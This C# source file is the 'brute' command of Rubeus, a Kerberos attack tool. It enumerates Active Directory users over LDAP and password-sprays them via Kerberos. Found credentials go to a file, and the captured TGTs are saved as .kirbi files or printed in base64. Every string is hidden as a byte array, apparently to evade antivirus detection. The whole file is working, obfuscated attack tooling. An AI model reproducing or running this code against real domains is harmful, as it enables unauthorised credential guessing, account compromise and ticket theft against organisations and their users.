using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Collections;
using System.Text.RegularExpressions;
using Microsoft.Win32;


namespace Rubeus.Commands
{
    public class Brute : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 98, 114, 117, 116, 101 });


        private string domain = S(new byte[] {});
        private string[] usernames = null;
        private string[] passwords = null;
        private string dc = S(new byte[] {});
        private string ou = S(new byte[] {});
        private string credUser = S(new byte[] {});
        private string credDomain = S(new byte[] {});
        private string credPassword = S(new byte[] {});
        private string outfile = S(new byte[] {});
        private uint verbose = 0;
        private bool saveTickets = true;

        protected class BruteArgumentException : ArgumentException
        {
            public BruteArgumentException(string message)
            : base(message)
            {
            }
        }

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 80, 101, 114, 102, 111, 114, 109, 32, 75, 101, 114, 98, 101, 114, 111, 115, 32, 66, 114, 117, 116, 101, 32, 70, 111, 114, 99, 101, 13, 10 }));
            try
            {
                this.ParseArguments(arguments);
                this.ObtainUsers();

                IBruteforcerReporter consoleReporter = new BruteforceConsoleReporter(
                    this.outfile, this.verbose, this.saveTickets);

                Bruteforcer bruter = new Bruteforcer(this.domain, this.dc, consoleReporter);
                bool success = bruter.Attack(this.usernames, this.passwords);
                if (success)
                {
                    if (!String.IsNullOrEmpty(this.outfile))
                    {
                        Console.WriteLine(S(new byte[] { 13, 10, 91, 43, 93, 32, 68, 111, 110, 101, 58, 32, 67, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115, 32, 115, 104, 111, 117, 108, 100, 32, 98, 101, 32, 115, 97, 118, 101, 100, 32, 105, 110, 32, 34, 123, 48, 125, 34, 13, 10 }), this.outfile);
                    }else
                    {
                        Console.WriteLine(S(new byte[] { 13, 10, 91, 43, 93, 32, 68, 111, 110, 101, 13, 10 }), this.outfile);
                    }
                } else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 45, 93, 32, 68, 111, 110, 101, 58, 32, 78, 111, 32, 99, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115, 32, 119, 101, 114, 101, 32, 100, 105, 115, 99, 111, 118, 101, 114, 101, 100, 32, 58, 39, 40, 13, 10 }));
                }
            }
            catch (BruteArgumentException ex)
            {
                Console.WriteLine(S(new byte[] { 13, 10 }) + ex.Message + S(new byte[] { 13, 10 }));
            }
            catch (RubeusException ex)
            {
                Console.WriteLine(S(new byte[] { 13, 10 }) + ex.Message + S(new byte[] { 13, 10 }));
            }
        }

        private void ParseArguments(Dictionary<string, string> arguments)
        {
            this.ParseDomain(arguments);
            this.ParseOU(arguments);
            this.ParseDC(arguments);
            this.ParseCreds(arguments);
            this.ParsePasswords(arguments);
            this.ParseUsers(arguments);
            this.ParseOutfile(arguments);
            this.ParseVerbose(arguments);
            this.ParseSaveTickets(arguments);
        }

        private void ParseDomain(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })))
            {
                this.domain = arguments[S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })];
            }
            else
            {
                this.domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
        }

        private void ParseOU(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117 })))
            {
                this.ou = arguments[S(new byte[] { 47, 111, 117 })];
            }
        }

        private void ParseDC(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 99 })))
            {
                this.dc = arguments[S(new byte[] { 47, 100, 99 })];
            }else
            {
                this.dc = this.domain;
            }
        }

        private void ParseCreds(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })))
            {
                if (!Regex.IsMatch(arguments[S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })], S(new byte[] { 46, 43, 92, 46, 43 }), RegexOptions.IgnoreCase))
                {
                    throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 47, 99, 114, 101, 100, 117, 115, 101, 114, 32, 115, 112, 101, 99, 105, 102, 105, 99, 97, 116, 105, 111, 110, 32, 109, 117, 115, 116, 32, 98, 101, 32, 105, 110, 32, 102, 113, 100, 110, 32, 102, 111, 114, 109, 97, 116, 32, 40, 100, 111, 109, 97, 105, 110, 46, 99, 111, 109, 92, 117, 115, 101, 114, 41 }));
                }

                string[] parts = arguments[S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })].Split('\\');
                this.credDomain = parts[0];
                this.credUser = parts[1];

                if (!arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100 })))
                {
                    throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100, 32, 105, 115, 32, 114, 101, 113, 117, 105, 114, 101, 100, 32, 119, 104, 101, 110, 32, 115, 112, 101, 99, 105, 102, 121, 105, 110, 103, 32, 47, 99, 114, 101, 100, 117, 115, 101, 114 }));
                }

                this.credPassword = arguments[S(new byte[] { 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100 })];
            }

        }

        private void ParsePasswords(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey(S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100, 115 })))
            {
                try
                {
                    this.passwords = File.ReadAllLines(arguments[S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100, 115 })]);
                }catch(FileNotFoundException)
                {
                    throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32, 111, 112, 101, 110, 32, 112, 97, 115, 115, 119, 111, 114, 100, 115, 32, 102, 105, 108, 101, 32, 34, 34, 58, 32, 78, 111, 116, 32, 102, 111, 117, 110, 100, 32, 102, 105, 108, 101 }));
                }
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })))
            {
                this.passwords = new string[] { arguments[S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })] };
            }
            else
            {
                throw new BruteArgumentException(
                    S(new byte[] { 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 112, 97, 115, 115, 119, 111, 114, 100, 33, 32, 85, 115, 101, 32, 47, 112, 97, 115, 115, 119, 111, 114, 100, 58, 60, 112, 97, 115, 115, 119, 111, 114, 100, 62, 32, 111, 114, 32, 47, 112, 97, 115, 115, 119, 111, 114, 100, 115, 58, 60, 102, 105, 108, 101, 62 }));
            }
        }

        private void ParseUsers(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 114, 115 })))
            {
                try {
                    this.usernames = File.ReadAllLines(arguments[S(new byte[] { 47, 117, 115, 101, 114, 115 })]);
                }catch (FileNotFoundException)
                {
                    throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32, 111, 112, 101, 110, 32, 117, 115, 101, 114, 115, 32, 102, 105, 108, 101, 32, 34, 34, 58, 32, 78, 111, 116, 32, 102, 111, 117, 110, 100, 32, 102, 105, 108, 101 }));
                }
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 114 })))
            {
                this.usernames = new string[] { arguments[S(new byte[] { 47, 117, 115, 101, 114 })] };
            }
        }

        private void ParseOutfile(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })))
            {
                this.outfile = arguments[S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })];
            }
        }

        private void ParseVerbose(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey(S(new byte[] { 47, 118, 101, 114, 98, 111, 115, 101 })))
            {
                this.verbose = 2;
            }
        }

        private void ParseSaveTickets(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey(S(new byte[] { 47, 110, 111, 116, 105, 99, 107, 101, 116 })))
            {
                this.saveTickets = false;
            }
        }

        private void ObtainUsers()
        {
            if(this.usernames == null)
            {
                this.usernames = this.DomainUsernames();
            }
            else
            {
                if(this.verbose == 0)
                {
                    this.verbose = 1;
                }
            }
        }

        private string[] DomainUsernames()
        {

            string domainController = this.DomainController();
            string bindPath = this.BindPath(domainController);
            DirectoryEntry directoryObject = new DirectoryEntry(bindPath);

            if (!String.IsNullOrEmpty(this.credUser))
            {
                string userDomain = String.Format("{0}\\{1}", this.credDomain, this.credUser);

                if (!this.AreCredentialsValid())
                {
                    throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 67, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115, 32, 115, 117, 112, 112, 108, 105, 101, 100, 32, 102, 111, 114, 32, 39, 39, 32, 97, 114, 101, 32, 105, 110, 118, 97, 108, 105, 100, 33 }));
                }
                
                directoryObject.Username = userDomain;
                directoryObject.Password = this.credPassword;

                Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 85, 115, 105, 110, 103, 32, 97, 108, 116, 101, 114, 110, 97, 116, 101, 32, 99, 114, 101, 100, 115, 32, 32, 58, 32, 123, 48, 125, 13, 10 }), userDomain);
            }


            DirectorySearcher userSearcher = new DirectorySearcher(directoryObject);
            userSearcher.Filter = S(new byte[] { 40, 115, 97, 109, 65, 99, 99, 111, 117, 110, 116, 84, 121, 112, 101, 61, 56, 48, 53, 51, 48, 54, 51, 54, 56, 41 });
            userSearcher.PropertiesToLoad.Add(S(new byte[] { 115, 97, 109, 65, 99, 99, 111, 117, 110, 116, 78, 97, 109, 101 }));

            try
            {
                SearchResultCollection users = userSearcher.FindAll();

                ArrayList usernames = new ArrayList();

                foreach (SearchResult user in users)
                {
                    string username = user.Properties[S(new byte[] { 115, 97, 109, 65, 99, 99, 111, 117, 110, 116, 78, 97, 109, 101 })][0].ToString();
                    usernames.Add(username);
                }

                return usernames.Cast<object>().Select(x => x.ToString()).ToArray();
            } catch(System.Runtime.InteropServices.COMException ex)
            {
                switch ((uint)ex.ErrorCode)
                {
                    case 0x8007052E:
                        throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 76, 111, 103, 105, 110, 32, 101, 114, 114, 111, 114, 32, 119, 104, 101, 110, 32, 114, 101, 116, 114, 105, 101, 118, 105, 110, 103, 32, 117, 115, 101, 114, 110, 97, 109, 101, 115, 32, 102, 114, 111, 109, 32, 100, 99, 32, 34, 34, 33, 32, 84, 114, 121, 32, 105, 116, 32, 98, 121, 32, 112, 114, 111, 118, 105, 100, 105, 110, 103, 32, 118, 97, 108, 105, 100, 32, 47, 99, 114, 101, 100, 117, 115, 101, 114, 32, 97, 110, 100, 32, 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100 }));
                    case 0x8007203A:
                        throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 69, 114, 114, 111, 114, 32, 99, 111, 110, 110, 101, 99, 116, 105, 110, 103, 32, 119, 105, 116, 104, 32, 116, 104, 101, 32, 100, 99, 32, 34, 34, 33, 32, 77, 97, 107, 101, 32, 115, 117, 114, 101, 32, 116, 104, 97, 116, 32, 112, 114, 111, 118, 105, 100, 101, 100, 32, 47, 100, 111, 109, 97, 105, 110, 32, 111, 114, 32, 47, 100, 99, 32, 97, 114, 101, 32, 118, 97, 108, 105, 100 }));
                    case 0x80072032:
                        throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 73, 110, 118, 97, 108, 105, 100, 32, 115, 121, 110, 116, 97, 120, 32, 105, 110, 32, 68, 78, 32, 115, 112, 101, 99, 105, 102, 105, 99, 97, 116, 105, 111, 110, 33, 32, 77, 97, 107, 101, 32, 115, 117, 114, 101, 32, 116, 104, 97, 116, 32, 47, 111, 117, 32, 105, 115, 32, 99, 111, 114, 114, 101, 99, 116 }));
                    case 0x80072030:
                        throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 84, 104, 101, 114, 101, 32, 105, 115, 32, 110, 111, 32, 115, 117, 99, 104, 32, 111, 98, 106, 101, 99, 116, 32, 111, 110, 32, 116, 104, 101, 32, 115, 101, 114, 118, 101, 114, 33, 32, 77, 97, 107, 101, 32, 115, 117, 114, 101, 32, 116, 104, 97, 116, 32, 47, 111, 117, 32, 105, 115, 32, 99, 111, 114, 114, 101, 99, 116 }));
                    default:
                        throw ex;
                }
            }
        }

        private string DomainController()
        {
            string domainController = null;


            if (String.IsNullOrEmpty(this.dc))
            {
                domainController = Networking.GetDCName();

                if(domainController == "")
                {
                    throw new BruteArgumentException(S(new byte[] { 91, 88, 93, 32, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32, 102, 105, 110, 100, 32, 68, 67, 32, 97, 100, 100, 114, 101, 115, 115, 33, 32, 84, 114, 121, 32, 105, 116, 32, 98, 121, 32, 112, 114, 111, 118, 105, 100, 105, 110, 103, 32, 47, 100, 111, 109, 97, 105, 110, 32, 111, 114, 32, 47, 100, 99 }));
                }
            }
            else
            {
                domainController = this.dc;
            }

            return domainController;
        }

        private string BindPath(string domainController)
        {
            string bindPath = String.Format(S(new byte[] { 76, 68, 65, 80, 58, 47, 47, 123, 48, 125 }), domainController);

            if (!String.IsNullOrEmpty(this.ou))
            {
                string ouPath = this.ou.Replace(S(new byte[] { 108, 100, 97, 112 }), S(new byte[] { 76, 68, 65, 80 })).Replace(S(new byte[] { 76, 68, 65, 80, 58, 47, 47 }), S(new byte[] {  }));
                bindPath = String.Format(S(new byte[] { 123, 48, 125, 47, 123, 49, 125 }), bindPath, ouPath);
            }
            else if (!String.IsNullOrEmpty(this.domain))
            {
                string domainPath = this.domain.Replace(S(new byte[] { 46 }), S(new byte[] { 44, 68, 67, 61 }));
                bindPath = String.Format(S(new byte[] { 123, 48, 125, 47, 68, 67, 61, 123, 49, 125 }), bindPath, domainPath);
            }

            return bindPath;
        }

        private bool AreCredentialsValid()
        {
            using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, this.credDomain))
            {
                return pc.ValidateCredentials(this.credUser, this.credPassword);
            }
        }

    }

    
    public class BruteforceConsoleReporter : IBruteforcerReporter
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

        private uint verbose;
        private string passwordsOutfile;
        private bool saveTicket;
        private bool reportedBadOutputFile = false;

        public BruteforceConsoleReporter(string passwordsOutfile, uint verbose = 0, bool saveTicket = true)
        {
            this.verbose = verbose;
            this.passwordsOutfile = passwordsOutfile;
            this.saveTicket = saveTicket;
        }

        public void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE)
        {
            this.WriteUserPasswordToFile(username, password);
            if (ticket != null)
            {
                Console.WriteLine(S(new byte[] { 91, 43, 93, 32, 83, 84, 85, 80, 69, 78, 68, 79, 85, 83, 32, 61, 62, 32, 123, 48, 125, 58, 123, 49, 125 }), username, password);
                this.HandleTicket(username, ticket);
            }
            else
            {
                Console.WriteLine(S(new byte[] { 91, 43, 93, 32, 85, 78, 76, 85, 67, 75, 89, 32, 61, 62, 32, 123, 48, 125, 58, 123, 49, 125, 32, 40, 123, 50, 125, 41 }), username, password, err);
            }
        }

        public void ReportValidUser(string domain, string username)
        {
            if (verbose > 0)
            {
                Console.WriteLine(S(new byte[] { 91, 43, 93, 32, 86, 97, 108, 105, 100, 32, 117, 115, 101, 114, 32, 61, 62, 32, 123, 48, 125 }), username);
            }
        }

        public void ReportInvalidUser(string domain, string username)
        {
            if (this.verbose > 1)
            {
                Console.WriteLine(S(new byte[] { 91, 45, 93, 32, 73, 110, 118, 97, 108, 105, 100, 32, 117, 115, 101, 114, 32, 61, 62, 32, 123, 48, 125 }), username);
            }
        }

        public void ReportBlockedUser(string domain, string username)
        {
            Console.WriteLine(S(new byte[] { 91, 45, 93, 32, 66, 108, 111, 99, 107, 101, 100, 47, 68, 105, 115, 97, 98, 108, 101, 100, 32, 117, 115, 101, 114, 32, 61, 62, 32, 123, 48, 125 }), username);
        }

        public void ReportKrbError(string domain, string username, KRB_ERROR krbError)
        {
            Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 123, 48, 125, 32, 75, 82, 66, 45, 69, 82, 82, 79, 82, 32, 40, 123, 49, 125, 41, 32, 58, 32, 123, 50, 125, 13, 10 }), username, 
                    krbError.error_code, (Interop.KERBEROS_ERROR)krbError.error_code);
        }


        private void WriteUserPasswordToFile(string username, string password)
        {
            if (String.IsNullOrEmpty(this.passwordsOutfile))
            {
                return;
            }

            string line = String.Format(S(new byte[] { 123, 48, 125, 58, 123, 49, 125, 123, 50, 125 }), username, password, Environment.NewLine);
            try
            {
                File.AppendAllText(this.passwordsOutfile, line);
            }catch(UnauthorizedAccessException)
            {
                if (!this.reportedBadOutputFile)
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32, 119, 114, 105, 116, 101, 32, 99, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115, 32, 105, 110, 32, 34, 34, 58, 32, 65, 99, 99, 101, 115, 115, 32, 100, 101, 110, 105, 101, 100 }), this.passwordsOutfile);
                    this.reportedBadOutputFile = true;
                }
            }
        }

        private void HandleTicket(string username, byte[] ticket)
        {
            if(this.saveTicket)
            {
                string ticketFilename = username + S(new byte[] { 46, 107, 105, 114, 98, 105 });
                File.WriteAllBytes(ticketFilename, ticket);
                Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 83, 97, 118, 101, 100, 32, 84, 71, 84, 32, 105, 110, 116, 111, 32, 123, 48, 125 }), ticketFilename);
            }
            else
            {
                this.PrintTicketBase64(username, ticket);
            }
        }

        private void PrintTicketBase64(string ticketname, byte[] ticket)
        {
            string ticketB64 = Convert.ToBase64String(ticket);

            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 98, 97, 115, 101, 54, 52, 40, 123, 48, 125, 46, 107, 105, 114, 98, 105, 41, 58, 13, 10 }), ticketname);

            // display in columns of 80 chararacters
            if (Rubeus.Program.wrapTickets)
            {
                foreach (string line in Helpers.Split(ticketB64, 80))
                {
                    Console.WriteLine(S(new byte[] { 32, 32, 32, 32, 32, 32, 32, 32, 123, 48, 125 }), line);
                }
            }
            else
            {
                Console.WriteLine(S(new byte[] { 32, 32, 32, 32, 32, 32, 32, 32, 123, 48, 125 }), ticketB64);
            }

            Console.WriteLine(S(new byte[] { 13, 10 }), ticketname);
        }

    }
}




